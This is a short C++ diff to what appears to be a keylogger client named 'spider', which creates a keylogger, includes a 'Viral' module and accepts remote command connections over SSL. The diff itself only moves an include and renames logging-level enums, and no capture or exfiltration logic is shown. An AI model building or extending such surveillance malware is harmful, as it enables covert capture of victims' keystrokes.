@@ -7,13 +7,13 @@
 
 #include <log/Logger.hpp>
 #include <Network/SSLConnection.hpp>
-#include <Network/ClientSession.hpp>
 #include <Network/TCPAcceptor.hpp>
 #include <Protocol/CommandHandler.hpp>
 #include <KeyLogger/KeyLogger.hpp>
 #include <KeyLogger/KeyLoggerFactory.hpp>
 #include <Viral/Viral.hpp>
 #include <Logging/LogHandle.hpp>
+#include <Core/ClientSession.hpp>
 #include <Core/ServerCommandSession.hpp>
 
 namespace spi
@@ -63,7 +63,7 @@ namespace spi
                 _sess->onError(boost::bind(&CSpiderCore::__removeSession, this, _1));
                 _sess->startSession();
             } else {
-                _log(logging::Level::Warning) << "Unable to accept a command connection: " << ec.message() << std::endl;
+                _log(logging::Warning) << "Unable to accept a command connection: " << ec.message() << std::endl;
                 __startAcceptor();
             }
         }
@@ -144,7 +144,7 @@ namespace spi
 
         KeyLogPtr _keyLogger{Factory::createKeyLogger(_io)};
 
-        logging::Logger _log{"client-spider", logging::Level::Debug};
+        logging::Logger _log{"client-spider", logging::Debug};
     };
 }
 
